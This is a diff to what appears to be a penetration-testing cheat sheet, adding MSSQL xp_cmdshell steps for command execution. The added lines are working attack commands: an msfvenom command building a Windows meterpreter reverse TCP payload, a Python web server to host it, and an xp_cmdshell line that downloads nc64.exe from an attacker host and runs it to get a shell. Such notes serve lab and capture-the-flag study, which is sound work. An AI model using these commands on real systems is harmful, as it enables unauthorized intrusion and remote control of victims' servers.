@@ -582,6 +582,17 @@ RECONFIGURE;
 ````
 xp_cmdshell "whoami"
 ````
+- Better Command Execution
+````
+xp_cmdshell "powershell -c pwd"
+````
+- Get a shell on target with `nc` or `msfvenom`
+````
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.154 LPORT=80 -f exe -o shell.exe
+python3 -m http.server
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.9/nc64.exe -outfile nc64.exe; ./nc64.exe"
+````
+
 ## Stuck
 - https://book.hacktricks.xyz/
 - https://guide.offsecnewbie.com/
